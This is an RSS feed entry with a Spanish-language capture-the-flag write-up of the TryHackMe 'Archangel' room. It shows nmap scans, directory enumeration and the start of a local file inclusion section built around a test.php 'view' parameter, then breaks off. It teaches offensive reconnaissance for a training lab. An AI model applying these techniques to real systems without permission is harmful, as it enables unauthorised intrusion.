<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>lfi log poisoning on sckull</title>
    <link>https://sckull.github.io/tags/lfi-log-poisoning/</link>
    <description>Recent content in lfi log poisoning on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Thu, 04 Feb 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/lfi-log-poisoning/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>TryHackMe - Archangel</title>
        <link>https://sckull.github.io/posts/archangel/</link>
        <pubDate>Thu, 04 Feb 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 04 Feb 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/archangel/</guid>
        <description>Archangel es una maquina de TryHackMe, presenta una vulnerabilidad LFI y mediante envenenamiento de log obtuvimos acceso a la maquina.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Archangel es una maquina de TryHackMe, presenta una vulnerabilidad LFI y mediante envenenamiento de log obtuvimos acceso a la maquina. Modificamos un script que es ejecutado por un cron para realizar movimiento lateral. Finalmente un archivo con permisos SUID y la lectura de su codigo fuente permitió que ejecutaramos bash como root.&lt;/p&gt;
&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/archangel&#34;&gt;Archangel&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Boot2root, Web exploitation, Privilege escalation, LFI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;210&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/Archangel&#34;&gt;Archangel&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/Archangel.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Feb  4 19:10:33 2021 as: nmap --min-rate 1000 -p- -T4 -oN portScan archangel.thm&lt;/span&gt;
Warning: 10.10.84.37 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; archangel.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.84.37&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;64873&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;660&lt;/span&gt; filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Feb  4 19:12:40 2021 -- 1 IP address (1 host up) scanned in 126.26 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Feb  4 19:13:30 2021 as: nmap -p22,80 -sV -sC -oN serviceScan -Pn archangel.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; archangel.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.84.37&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.34s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Wavefire
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Feb  4 19:14:04 2021 -- 1 IP address (1 host up) scanned in 34.20 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80 y nuevo dominio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_181544.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el dominio encontrado vemos nuestra primera flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/archangel/Screenshot_20210204_181657.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rustbuster&#34;&gt;RUSTBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos rustbuster para busqueda de directorios y archivos en el dominio encontrado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2021-02-04 19:17:52

GET	&lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden			http://mafialive.thm/.php
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://mafialive.thm/
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://mafialive.thm/index.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://mafialive.thm/robots.txt
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://mafialive.thm/server-status
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://mafialive.thm/test.php

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ended at: 2021-02-04 19:23:171
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;lfi---www-data-user&#34;&gt;LFI - WWW-DATA (USER)&lt;/h1&gt;
&lt;p&gt;En la pagina &lt;code&gt;test.php&lt;/code&gt; vemos que existe una vulnerabilidad LFI ya que se le esta pasando al parametro &lt;code&gt;view&lt;/code&gt; la direccion completa del archivo a mostrar en la pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;lt;!DOCTYPE HTML&amp;gt;
&amp;lt;html&amp;gt;

&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;INCLUDE&amp;lt;/title&amp;gt;
    &amp;lt;h1&amp;gt;Test Page. Not to be Deployed&amp;lt;/h1&amp;gt;
 
    &amp;lt;/button&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/test.php?view=/var/www/html/development_testing/mrrobot.php&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;button &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;secret&amp;#34;&lt;/span&gt;&amp;gt;Here is a button&amp;lt;/button&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
